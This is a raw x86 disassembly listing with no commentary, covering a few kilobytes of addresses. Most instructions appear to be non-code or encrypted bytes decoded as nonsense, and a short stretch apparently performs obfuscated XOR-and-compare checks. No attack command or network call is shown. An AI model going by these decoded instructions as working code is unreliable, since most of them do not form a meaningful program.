  41b223:	fs inc ecx
  41b225:	stos   BYTE PTR es:[edi],al
  41b226:	pop    ebp
  41b227:	push   ebp
  41b228:	and    bl,bh
  41b22a:	gs (bad) 
  41b22c:	pop    edi
  41b22d:	imul   eax,DWORD PTR [edi-0x42],0x57adc3c6
  41b234:	xchg   esi,eax
  41b235:	jae    0x41b29c
  41b237:	jnp    0x41b293
  41b239:	add    eax,0x72491a5d
  41b23e:	add    al,0xda
  41b240:	loope  0x41b23f
  41b242:	adc    DWORD PTR ds:0x170cbfed,eax
  41b248:	mov    dh,0x3d
  41b24a:	jmp    0xaac18360
  41b24f:	mov    ds:0xd33e6be1,al
  41b254:	pop    eax
  41b255:	push   eax
  41b256:	fsub   DWORD PTR [esi+0x20a0f207]
  41b25c:	fistp  QWORD PTR [eax-0x5c]
  41b25f:	sbb    DWORD PTR [ebp-0x45],ebp
  41b262:	sbb    DWORD PTR [esi+0x6721d7d5],esp
  41b268:	div    DWORD PTR [edx]
  41b26a:	int    0xe7
  41b26c:	cld    
  41b26d:	sbb    DWORD PTR [edx-0x677aa39e],esp
  41b273:	sar    dh,0xce
  41b276:	pop    eax
  41b277:	aaa    
  41b278:	enter  0xafe6,0x6f
  41b27c:	daa    
  41b27d:	pop    ds
  41b27e:	dec    ebx
  41b27f:	in     eax,0x40
  41b281:	lea    edi,[ecx+edx*1-0x14]
  41b285:	inc    esp
  41b286:	inc    ebx
  41b287:	or     ch,BYTE PTR [ebx+0x10257882]
  41b28d:	push   esp
  41b28e:	mov    bl,0xee
  41b290:	cmp    al,cl
  41b292:	xchg   ebp,eax
  41b293:	push   esi
  41b294:	cli    
  41b295:	nop
  41b296:	jmp    0x41b316
  41b298:	int3   
  41b299:	outs   dx,DWORD PTR ds:[esi]
  41b29a:	mov    ebx,0x528c1d7b
  41b29f:	push   edi
  41b2a0:	or     ebx,DWORD PTR [ebx]
  41b2a2:	inc    ecx
  41b2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2a4:	mov    sp,0x8bb3
  41b2a8:	mov    edi,ecx
  41b2aa:	sbb    BYTE PTR [edx-0x50],dl
  41b2ad:	stos   DWORD PTR es:[edi],eax
  41b2ae:	jbe    0x41b2d2
  41b2b0:	xor    eax,eax
  41b2b2:	lods   al,BYTE PTR ds:[esi]
  41b2b3:	jns    0x41b262
  41b2b5:	or     BYTE PTR ds:0x5300a4d,0xe6
  41b2bc:	xchg   ebx,eax
  41b2bd:	xchg   ecx,eax
  41b2be:	fcomp  DWORD PTR [ebp+0x42]
  41b2c1:	stos   BYTE PTR es:[edi],al
  41b2c2:	add    ebp,ebx
  41b2c4:	push   esp
  41b2c5:	jg     0x41b2c0
  41b2c7:	mov    al,0x21
  41b2c9:	(bad)  
  41b2ca:	lahf   
  41b2cb:	pusha  
  41b2cc:	outs   dx,DWORD PTR ds:[esi]
  41b2cd:	dec    ebx
  41b2ce:	push   ds
  41b2cf:	inc    ecx
  41b2d0:	data16 sub BYTE PTR [edi+esi*8],bl
  41b2d4:	retf   0x6f66
  41b2d7:	and    eax,0x749ae6b4
  41b2dc:	fs ret 
  41b2de:	icebp  
  41b2df:	sbb    dh,BYTE PTR [ebx+0x69]
  41b2e2:	add    esp,DWORD PTR [ebp+ebx*8+0x468f2624]
  41b2e9:	xlat   BYTE PTR ds:[ebx]
  41b2ea:	lds    edx,FWORD PTR [ebp-0x51faad80]
  41b2f0:	and    eax,0xa4516db1
  41b2f5:	jbe    0x41b302
  41b2f7:	or     DWORD PTR [edx-0x20],ebp
  41b2fa:	push   edi
  41b2fb:	cmp    cl,bl
  41b2fd:	sbb    BYTE PTR [edi+0x5c04e882],al
  41b303:	call   0x429d:0x53687adc
  41b30a:	dec    ecx
  41b30b:	push   ecx
  41b30c:	sub    BYTE PTR [edi+edx*2],ah
  41b30f:	xchg   esi,eax
  41b310:	fmul   st(6),st
  41b312:	in     eax,0x14
  41b314:	and    ch,bh
  41b316:	mov    ecx,0xc1b33bd8
  41b31b:	sbb    al,0x75
  41b31d:	adc    BYTE PTR [esi+0x27f76681],dl
  41b323:	mov    eax,0xd41b09fd
  41b328:	stos   DWORD PTR es:[edi],eax
  41b329:	dec    edx
  41b32a:	mov    ds:0x6f2a058a,al
  41b32f:	jmp    0x148736db
  41b334:	dec    edx
  41b335:	popf   
  41b336:	pop    ds
  41b337:	arpl   dx,ax
  41b339:	dec    esp
  41b33a:	xchg   ebx,eax
  41b33b:	ret    
  41b33c:	mov    eax,DWORD PTR [ecx+0x79a577f2]
  41b342:	retf   0xac0f
  41b345:	ret    0xc102
  41b348:	call   0x24863c4f
  41b34d:	xor    al,0x8b
  41b34f:	inc    esp
  41b350:	and    al,0x18
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	jnp    0x41b3b5
  41b369:	stos   DWORD PTR es:[edi],eax
  41b36a:	mov    al,0xbb
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1+0xaf91818],bh
  41b375:	xor    WORD PTR [edx-0x2a],bx
  41b379:	loope  0x41b31b
  41b37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37c:	and    BYTE PTR [edi+0x1d570a20],0x46
  41b383:	aad    0x9b
  41b385:	inc    eax
  41b386:	mov    cs,WORD PTR [edi]
  41b388:	in     al,dx
  41b389:	dec    ebp
  41b38a:	pop    ecx
  41b38b:	in     al,dx
  41b38c:	jmp    0x4cf6:0x174e9dac
  41b393:	mov    cl,0xca
  41b395:	(bad)  
  41b396:	dec    esi
  41b397:	les    esi,FWORD PTR [esi+0x405808a7]
  41b39d:	call   0x16c641f3
  41b3a2:	push   0x731354a1
  41b3a7:	fcom   QWORD PTR [edx+0x39]
  41b3aa:	or     al,0x6f
  41b3ac:	inc    ecx
  41b3ad:	and    ebx,ecx
  41b3af:	pop    esi
  41b3b0:	lds    eax,FWORD PTR [edi-0x4]
  41b3b3:	jecxz  0x41b385
  41b3b5:	rcr    BYTE PTR [esi+eiz*1+0x3e6e02e3],cl
  41b3bc:	scas   eax,DWORD PTR es:[edi]
  41b3bd:	adc    BYTE PTR [esi+0x536e0ec9],dl
  41b3c3:	push   ds
  41b3c4:	dec    ecx
  41b3c5:	pusha  
  41b3c6:	bound  esp,QWORD PTR [esi+0x18]
  41b3c9:	aas    
  41b3ca:	and    cl,BYTE PTR [ebx]
  41b3cc:	sbb    DWORD PTR [ebp+0x7461dc6],esi
  41b3d2:	sub    eax,0x655a55a9
  41b3d7:	pop    ebp
  41b3d8:	mov    al,ds:0x777b8b86
  41b3dd:	push   ebp
  41b3de:	pop    edi
  41b3df:	sub    al,0x9c
  41b3e1:	pop    ecx
  41b3e2:	ror    BYTE PTR [edx+0x2742d701],1
  41b3e8:	out    0x52,eax
  41b3ea:	dec    eax
  41b3eb:	(bad)  
  41b3ec:	mov    dh,0x87
  41b3ee:	sahf   
  41b3ef:	aaa    
  41b3f0:	jle    0x41b3da
  41b3f2:	adc    eax,DWORD PTR [edx+0x18]
  41b3f5:	test   ch,dh
  41b3f7:	rol    DWORD PTR [eax+eiz*4+0x3b],0x7b
  41b3fc:	add    bl,al
  41b3fe:	call   0xe527ddc
  41b403:	dec    ecx
  41b404:	lods   eax,DWORD PTR ds:[esi]
  41b405:	jae    0x41b3f8
  41b407:	es ss inc eax
  41b40a:	bound  esi,QWORD PTR [ebx+esi*1]
  41b40d:	cli    
  41b40e:	loopne 0x41b3e2
  41b410:	imul   esp,DWORD PTR [esi-0x70],0xac44a42f
  41b417:	stos   DWORD PTR es:[edi],eax
  41b418:	call   0xd508:0x34593c34
  41b41f:	pop    es
  41b420:	(bad)  
  41b421:	sbb    dl,BYTE PTR [ebx+0x21]
  41b424:	xchg   ecx,eax
  41b425:	dec    ebx
  41b426:	sub    BYTE PTR [ecx+0x39],dh
  41b429:	repz adc eax,0x3303feaf
  41b42f:	mov    BYTE PTR [edi-0x6e],bh
  41b432:	repz daa 
  41b434:	es in  al,0xa
  41b437:	lahf   
  41b438:	fdivr  QWORD PTR [ecx+ecx*1+0x5f520bef]
  41b43f:	xchg   ecx,eax
  41b440:	jle    0x41b46b
  41b442:	mov    bl,BYTE PTR [esi-0x6bff09e5]
  41b448:	xor    edi,eax
  41b44a:	jle    0x41b441
  41b44c:	enter  0xf44b,0xc5
  41b450:	jmp    0xc06872e0
  41b455:	test   eax,0x5c0f376b
  41b45a:	jg     0x41b4ae
  41b45c:	dec    edx
  41b45d:	scas   eax,DWORD PTR es:[edi]
  41b45e:	adc    BYTE PTR gs:[ebx],ch
  41b461:	repnz adc ebp,DWORD PTR [esi+eiz*1-0x6f4279cd]
  41b469:	add    DWORD PTR [ecx-0x4df3a3b9],0x55
  41b470:	ret    0xe14e
  41b473:	and    DWORD PTR [esi-0x19cf829],eax
  41b479:	repnz inc eax
  41b47b:	pop    esp
  41b47c:	adc    dl,BYTE PTR [ebx+0x7582525a]
  41b482:	xchg   edi,eax
  41b483:	dec    ebx
  41b484:	xor    al,0x49
  41b486:	pop    ss
  41b487:	jbe    0x41b49a
  41b489:	xor    DWORD PTR ds:0x3d2ee7f0,edx
  41b48f:	cmp    eax,0x287151dd
  41b494:	out    0x34,eax
  41b496:	xor    al,0x17
  41b498:	sub    edx,ebx
  41b49a:	sbb    DWORD PTR [edi-0x5ea38fb2],esp
  41b4a0:	sub    eax,edx
  41b4a2:	cs pop ebp
  41b4a4:	pop    ds
  41b4a5:	fidiv  DWORD PTR [esi]
  41b4a7:	addr16 mov ds:0xba16,al
  41b4ab:	in     eax,0x72
  41b4ad:	add    edx,ebp
  41b4af:	cmp    al,0x13
  41b4b1:	push   esi
  41b4b2:	pop    ss
  41b4b3:	js     0x41b52b
  41b4b5:	sub    eax,0xfe415259
  41b4ba:	int3   
  41b4bb:	aam    0x1d
  41b4bd:	push   ebp
  41b4be:	cld    
  41b4bf:	add    cl,BYTE PTR [edx+0x333f4878]
  41b4c5:	push   eax
  41b4c6:	mov    WORD PTR [ebp+0x54],gs
  41b4c9:	ins    BYTE PTR es:[edi],dx
  41b4ca:	xor    al,0x2f
  41b4cc:	cld    
  41b4cd:	mov    dl,0x86
  41b4cf:	pop    ds
  41b4d0:	adc    ch,BYTE PTR [edx-0x7c]
  41b4d3:	pop    ebx
  41b4d4:	push   eax
  41b4d5:	jnp    0x41b4f5
  41b4d7:	je     0x41b51b
  41b4d9:	outs   dx,DWORD PTR ds:[esi]
  41b4da:	mov    ds:0x566f77f,al
  41b4df:	xchg   ebp,eax
  41b4e0:	inc    edx
  41b4e1:	in     al,0x37
  41b4e3:	(bad)  
  41b4e4:	push   cs
  41b4e5:	mov    cl,0xb8
  41b4e7:	push   ds
  41b4e8:	ins    DWORD PTR es:[edi],dx
  41b4e9:	dec    ecx
  41b4eb:	dec    ebp
  41b4ec:	frstor [esi+ebx*4-0x6456eca9]
  41b4f3:	in     eax,0x8e
  41b4f5:	stos   BYTE PTR es:[edi],al
  41b4f6:	popa   
  41b4f7:	lods   eax,DWORD PTR ds:[esi]
  41b4f8:	or     esi,DWORD PTR [ebp-0x22]
  41b4fb:	jl     0x41b494
  41b4fd:	mov    al,ds:0x1270e268
  41b502:	repz addr16 jp 0x41b57a
  41b506:	adc    al,0xaa
  41b508:	or     al,0x5b
  41b50a:	add    ecx,DWORD PTR [esi-0x78]
  41b50d:	push   cs
  41b50e:	fcomi  st,st(2)
  41b510:	gs js  0x41b4be
  41b513:	xor    DWORD PTR [edi],esp
  41b515:	nop
  41b516:	popf   
  41b517:	mov    edx,0xcd2b51c6
  41b51c:	mov    eax,ds:0xf6466192
  41b521:	popf   
  41b522:	pusha  
  41b523:	out    dx,al
  41b524:	adc    DWORD PTR cs:[ebx],edx
  41b527:	xor    DWORD PTR [edx],ebp
  41b529:	and    BYTE PTR [eax+0x48f0cca6],al
  41b52f:	sahf   
  41b530:	les    ecx,FWORD PTR [ebx]
  41b532:	mov    DWORD PTR [esi],ebx
  41b534:	mov    eax,0x335f2cbf
  41b539:	frstpm(287 only) 
  41b53b:	nop
  41b53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53d:	and    eax,0x8d581746
  41b542:	cmp    al,0x51
  41b544:	jb     0x41b592
  41b546:	xchg   DWORD PTR [edi+eax*1],eax
  41b549:	pop    ds
  41b54a:	mov    ch,0x74
  41b54c:	lock cs stos BYTE PTR es:[edi],al
  41b54f:	mov    ecx,0x4725099a
  41b554:	dec    ebx
  41b555:	jl     0x41b5c0
  41b557:	cmp    edi,ecx
  41b559:	(bad)  
  41b55a:	xchg   esp,eax
  41b55b:	aaa    
  41b55c:	mov    esp,0x742a2e3d
  41b561:	lahf   
  41b562:	out    dx,eax
  41b563:	jge    0x41b59b
  41b565:	test   BYTE PTR [eax-0x53],cl
  41b568:	mov    dl,0xe0
  41b56a:	ss push ecx
  41b56c:	loopne 0x41b572
  41b56e:	jp     0x41b526
  41b570:	xchg   ebp,eax
  41b571:	inc    esi
  41b572:	mov    esp,0x9ed3598e
  41b577:	push   eax
  41b578:	mov    dh,0x5b
  41b57a:	imul   ecx,DWORD PTR [eax+0x4a],0xffffffd2
  41b57e:	fwait
  41b57f:	sbb    ebp,DWORD PTR [esi+0x61bbc61c]
  41b585:	lods   al,BYTE PTR ds:[esi]
  41b586:	js     0x41b5ff
  41b588:	in     eax,dx
  41b589:	ret    0x1cb0
  41b58c:	into   
  41b58d:	and    eax,0x254410a0
  41b592:	lock sub ch,0x9c
  41b596:	mov    ?,WORD PTR [edi+0x6c]
  41b599:	ret    
  41b59a:	leave  
  41b59b:	(bad)  
  41b59c:	cmp    eax,0x789bf4ea
  41b5a1:	retf   0xa904
  41b5a4:	cdq    
  41b5a5:	mov    ebx,0x963f519f
  41b5aa:	out    dx,al
  41b5ab:	pop    ecx
  41b5ac:	dec    edi
  41b5ad:	stos   DWORD PTR es:[edi],eax
  41b5ae:	cs icebp 
  41b5b0:	lahf   
  41b5b1:	in     eax,dx
  41b5b2:	test   BYTE PTR [edi-0xc3a1e08],al
  41b5b8:	stos   DWORD PTR es:[edi],eax
  41b5b9:	loop   0x41b617
  41b5bb:	gs call 0x446dbf2f
  41b5c1:	mov    ecx,0x49a86e9b
  41b5c6:	dec    eax
  41b5c7:	push   0x14cfa88d
  41b5cc:	jmp    0x7717797
  41b5d1:	out    dx,al
  41b5d2:	push   es
  41b5d3:	adc    BYTE PTR [edx+0x10],dl
  41b5d6:	sub    al,0x2
  41b5d8:	arpl   WORD PTR [ecx],si
  41b5da:	push   cs
  41b5db:	mov    ebx,ebx
  41b5dd:	push   edi
  41b5de:	jecxz  0x41b582
  41b5e0:	clc    
  41b5e1:	mov    esi,0x240d810
  41b5e6:	leave  
  41b5e7:	mov    dh,0x69
  41b5e9:	js     0x41b581
  41b5eb:	xlat   BYTE PTR ds:[ebx]
  41b5ec:	xchg   esp,esp
  41b5ee:	cmp    dl,al
  41b5f0:	imul   edx,DWORD PTR [ebx+ebp*2],0x48f4e419
  41b5f7:	pusha  
  41b5f8:	add    dh,BYTE PTR [eax+0x98234ad]
  41b5fe:	mov    dl,dh
  41b600:	or     al,0x5b
  41b602:	push   esi
  41b603:	out    0xad,al
  41b605:	popf   
  41b606:	mov    eax,ds:0xfe10ff3
  41b60b:	ins    BYTE PTR es:[edi],dx
  41b60c:	gs test ax,0xc34b
  41b611:	stc    
  41b612:	inc    ebp
  41b613:	retf   
  41b614:	or     eax,0x5c854741
  41b619:	js     0x41b64c
  41b61b:	arpl   WORD PTR [edi+0x7c6d65a],ax
  41b621:	test   al,0xbc
  41b623:	retf   
  41b624:	mov    cl,BYTE PTR [ecx-0x7161cdb9]
  41b62a:	iret   
  41b62b:	xchg   ebp,eax
  41b62c:	int3   
  41b62d:	xchg   BYTE PTR [eax-0x1e97c64f],cl
  41b633:	jno    0x41b620
  41b635:	adc    esi,edi
  41b637:	sub    BYTE PTR [eax-0x51],dl
  41b63a:	retf   0xe4b4
  41b63d:	pushf  
  41b63e:	and    BYTE PTR [edx-0x1f],al
  41b641:	(bad)  
  41b642:	mov    eax,ds:0x279a1c48
  41b647:	pop    es
  41b648:	jge    0x41b60c
  41b64a:	inc    esi
  41b64b:	add    esi,DWORD PTR [ebp+0x82e9da7]
  41b651:	stos   BYTE PTR es:[edi],al
  41b652:	call   0xe7da:0xa35a5d60
  41b659:	fild   DWORD PTR [edx+0x6f]
  41b65c:	hlt    
  41b65d:	mov    al,ds:0xc4ae8e2
  41b662:	lahf   
  41b663:	pop    es
  41b664:	cli    
  41b665:	push   es
  41b666:	sub    eax,edi
  41b668:	inc    edx
  41b669:	loope  0x41b6c5
  41b66b:	stc    
  41b66c:	push   edi
  41b66d:	mov    dl,0xaa
  41b66f:	xor    ch,BYTE PTR [ebp-0x717247a1]
  41b675:	hlt    
  41b676:	or     BYTE PTR [eax],0x18
  41b679:	int3   
  41b67a:	dec    ebp
  41b67b:	(bad)  
  41b67c:	fisub  WORD PTR [ebp-0x5d1469a6]
  41b682:	xchg   edi,eax
  41b683:	dec    eax
  41b684:	sti    
  41b685:	(bad)  
  41b686:	fsubr  DWORD PTR [ebx+0x2a]
  41b689:	mov    bl,0x54
  41b68b:	retf   
  41b68c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b68d:	shl    BYTE PTR [eax],0xd8
  41b690:	mov    esp,0xd4d344f5
  41b695:	pop    ebx
  41b696:	(bad)  
  41b697:	mov    dh,0x44
  41b699:	dec    edi
  41b69a:	inc    edx
  41b69b:	jae    0x41b6a6
  41b69d:	inc    esp
  41b69e:	cli    
  41b69f:	ret    
  41b6a0:	add    bl,bh
  41b6a2:	leave  
  41b6a3:	push   ebp
  41b6a4:	inc    esp
  41b6a5:	enter  0xaa59,0xb5
  41b6a9:	pop    edx
  41b6aa:	lods   eax,DWORD PTR ds:[esi]
  41b6ab:	mov    eax,0x363bc422
  41b6b0:	pop    esp
  41b6b1:	mov    ds:0x4e46c99a,al
  41b6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6b7:	push   ss
  41b6b8:	xor    DWORD PTR [ecx-0xdd05631],ebx
  41b6be:	mov    edx,0x3bd906af
  41b6c3:	xlat   BYTE PTR ds:[ebx]
  41b6c4:	ins    DWORD PTR es:[edi],dx
  41b6c5:	add    edx,ecx
  41b6c7:	shl    BYTE PTR [ebx],0x39
  41b6ca:	cmp    eax,0xcd3a2d59
  41b6cf:	jmp    0x41b734
  41b6d1:	fdivr  DWORD PTR [esi]
  41b6d3:	xor    BYTE PTR [esi-0x575dc85c],0xd7
  41b6da:	inc    ecx
  41b6db:	and    dh,BYTE PTR [esi+0x53]
  41b6de:	lds    ecx,FWORD PTR [ebx-0x4d49dbee]
  41b6e4:	push   eax
  41b6e5:	inc    edx
  41b6e6:	popf   
  41b6e7:	sub    bh,bh
  41b6e9:	jle    0x41b6e4
  41b6eb:	outs   dx,DWORD PTR ds:[esi]
  41b6ec:	lea    eax,[edi]
  41b6ee:	js     0x41b698
  41b6f0:	pop    edi
  41b6f1:	inc    ecx
  41b6f2:	scas   eax,DWORD PTR es:[edi]
  41b6f3:	or     al,0x1c
  41b6f5:	adc    al,0xb6
  41b6f7:	dec    ebx
  41b6f8:	ds push ecx
  41b6fa:	in     al,dx
  41b6fb:	mov    ah,0x6c
  41b6fd:	push   esp
  41b6fe:	pushf  
  41b6ff:	sbb    edi,esi
  41b701:	pop    esp
  41b702:	xchg   esi,eax
  41b703:	inc    esi
  41b704:	enter  0x2d5b,0x48
  41b708:	(bad)  
  41b709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b70a:	xlat   BYTE PTR gs:[ebx]
  41b70c:	dec    ecx
  41b70d:	push   0xffffff96
  41b70f:	data16 adc al,0xc0
  41b712:	lock mov bh,0x26
  41b716:	sub    ch,dl
  41b718:	ja     0x41b77b
  41b71a:	jl     0x41b6b5
  41b71c:	fisubr WORD PTR [edi-0x513a690a]
  41b722:	cmp    eax,ebx
  41b724:	lahf   
  41b725:	shl    eax,0x1e
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225d4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225cc
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42255c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x1eaa298c],dh
  41b815:	call   0x1816:0x895ebca3
  41b81c:	mov    esp,0x69181812
  41b821:	push   edi
  41b822:	dec    eax
  41b823:	loope  0x41b821
  41b825:	daa    
  41b826:	hlt    
  41b827:	pop    eax
  41b828:	sub    dl,bl
  41b82a:	fwait
  41b82b:	inc    eax
  41b82c:	adc    eax,0x55e7ba6c
  41b831:	lods   al,BYTE PTR ds:[esi]
  41b832:	bound  ecx,QWORD PTR ds:0x2bac7b22
  41b838:	mov    WORD PTR ds:[esp+eiz*8],ss
  41b83c:	and    DWORD PTR [ecx],0xe52d9588
  41b842:	outs   dx,BYTE PTR ds:[esi]
  41b843:	(bad)  
  41b844:	and    eax,0x4920a105
  41b849:	mov    ah,0xcb
  41b84b:	cmp    BYTE PTR [ecx],al
  41b84d:	outs   dx,BYTE PTR ds:[esi]
  41b84e:	mov    dl,0xcb
  41b850:	mov    ah,BYTE PTR [edi-0x62]
  41b853:	jmp    0x41b8b4
  41b855:	rcl    ah,0x37
  41b858:	jl     0x41b8af
  41b85a:	fdivr  st(5),st
  41b85c:	pop    eax
  41b85d:	mov    al,0x9b
  41b85f:	test   DWORD PTR [ecx-0x391d6237],esp
  41b865:	gs cdq 
  41b867:	cmp    al,0x19
  41b869:	xchg   BYTE PTR [edi-0x73d60a3f],dl
  41b86f:	(bad)  
  41b870:	rcl    DWORD PTR [eax],1
  41b872:	ret    
  41b873:	mov    ch,0xf9
  41b875:	arpl   WORD PTR [ebp+0xe],bx
  41b878:	fstp   st(5)
  41b87a:	dec    edi
  41b87b:	stos   BYTE PTR es:[edi],al
  41b87c:	outs   dx,BYTE PTR ds:[esi]
  41b87d:	stc    
  41b87e:	dec    edi
  41b87f:	stos   DWORD PTR es:[edi],eax
  41b880:	xchg   DWORD PTR [eax-0x38],eax
  41b883:	cmp    BYTE PTR [eax+0x56],ch
  41b886:	jnp    0x41b8fe
  41b888:	xchg   ebp,eax
  41b889:	cmp    al,0x1c
  41b88b:	std    
  41b88c:	leave  
  41b88d:	popf   
  41b88e:	(bad)  
  41b88f:	fisub  DWORD PTR [ecx+0x36]
  41b892:	xor    bl,BYTE PTR [ebx-0x1146ba82]
  41b898:	outs   dx,DWORD PTR ds:[esi]
  41b899:	xchg   dl,ch
  41b89b:	mov    eax,ds:0x1d299f97
  41b8a0:	leave  
  41b8a1:	fwait
  41b8a2:	das    
  41b8a3:	push   edi
  41b8a4:	push   edi
  41b8a5:	inc    ebp
  41b8a6:	jp     0x41b8d5
  41b8a8:	popa   
  41b8a9:	out    0xd8,eax
  41b8ab:	leave  
  41b8ac:	mov    esp,0xb50c22c7
  41b8b1:	ja     0x41b88b
  41b8b3:	loope  0x41b895
  41b8b5:	sbb    bh,BYTE PTR [edx-0x62417b84]
  41b8bb:	jb     0x41b8af
  41b8bd:	in     eax,dx
  41b8be:	mov    dl,BYTE PTR [eax+0x7db15ab9]
  41b8c4:	xchg   esp,eax
  41b8c5:	sub    BYTE PTR [edi+0x4edea702],0xa2
  41b8cc:	xchg   edx,eax
  41b8cd:	maskmovq mm1,mm3
  41b8d0:	hlt    
  41b8d1:	std    
  41b8d2:	xor    DWORD PTR [ecx+0x4dc61ada],ecx
  41b8d8:	stos   BYTE PTR es:[edi],al
  41b8d9:	xchg   ecx,eax
  41b8da:	pusha  
  41b8db:	pop    ecx
  41b8dc:	dec    edx
  41b8dd:	jecxz  0x41b94e
  41b8df:	div    ch
  41b8e1:	les    edx,FWORD PTR [ecx-0x67]
  41b8e4:	(bad)  
  41b8e5:	rol    BYTE PTR [eax],cl
  41b8e7:	rep es ins BYTE PTR es:[edi],dx
  41b8ea:	push   cs
  41b8eb:	or     edx,DWORD PTR [ebx-0x3c5fdc75]
  41b8f1:	div    BYTE PTR ds:0x37729281
  41b8f7:	fwait
  41b8f8:	add    esi,DWORD PTR [eax+0x5f47b834]
  41b8fe:	lock mov ecx,0x3b33b64b
  41b904:	ficomp WORD PTR [edx-0x48]
  41b907:	mov    dh,0xa8
  41b909:	sti    
  41b90a:	jmp    0x51695158
  41b90f:	int3   
  41b910:	in     eax,0x49
  41b912:	or     al,0x72
  41b914:	jge    0x41b8bf
  41b916:	iret   
  41b917:	mov    edi,0xc5c40b4d
  41b91c:	mov    dl,0x5b
  41b91e:	lahf   
  41b91f:	outs   dx,DWORD PTR ds:[esi]
  41b920:	jg     0x41b95a
  41b922:	hlt    
  41b923:	xchg   esp,ecx
  41b925:	mov    ds:0x470adc72,eax
  41b92a:	repz leave 
  41b92c:	jb     0x41b977
  41b92e:	sahf   
  41b92f:	imul   ecx,DWORD PTR [eax],0x2b
  41b932:	cld    
  41b933:	icebp  
  41b934:	or     eax,0x2fecb6bb
  41b939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b93a:	shr    DWORD PTR [edi+0x62db4d48],0x10
  41b941:	es jae 0xf21ab8da
  41b948:	sahf   
  41b949:	push   0xf5c4a280
  41b94e:	and    esi,ebx
  41b950:	xor    ah,bl
  41b952:	push   ds
  41b953:	test   DWORD PTR [edx+0x23],ecx
  41b956:	out    0x5e,eax
  41b958:	fnsave [eax+eax*4]
  41b95b:	pop    edi
  41b95c:	les    eax,FWORD PTR [ebx+0x44]
  41b95f:	fadd   DWORD PTR [ebp-0x15e35493]
  41b965:	scas   eax,DWORD PTR es:[edi]
  41b966:	inc    eax
  41b967:	mul    BYTE PTR [esi+0x48]
  41b96a:	mov    ecx,0xdcf8a56c
  41b96f:	dec    edx
  41b970:	shl    DWORD PTR [esi],0x4e
  41b973:	sbb    al,0x60
  41b975:	test   BYTE PTR [ebp+0x8],bl
  41b978:	cld    
  41b979:	lods   eax,DWORD PTR ds:[esi]
  41b97a:	rcl    DWORD PTR [ebp-0x28],cl
  41b97d:	pop    esp
  41b97e:	imul   eax,DWORD PTR [ebx],0x56
  41b981:	fnstenv [edi]
  41b983:	pusha  
  41b984:	stos   DWORD PTR es:[edi],eax
  41b985:	sbb    al,dl
  41b987:	xor    al,0x8a
  41b989:	jp     0x41b9cd
  41b98b:	scas   eax,DWORD PTR es:[edi]
  41b98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b98d:	or     ebp,edi
  41b98f:	adc    eax,eax
  41b991:	xor    edx,DWORD PTR [esi+0x18b214f0]
  41b997:	mov    edx,0x70b11efd
  41b99c:	pop    ecx
  41b99d:	fmul   st(2),st
  41b99f:	dec    eax
  41b9a0:	inc    eax
  41b9a1:	data16 clc 
  41b9a3:	sbb    dl,ch
  41b9a5:	cdq    
  41b9a6:	outs   dx,DWORD PTR ds:[esi]
  41b9a7:	or     ah,BYTE PTR [edx]
  41b9a9:	das    
  41b9aa:	ret    
  41b9ab:	pop    es
  41b9ac:	loopne 0x41b9a7
  41b9ae:	rol    BYTE PTR [edi],cl
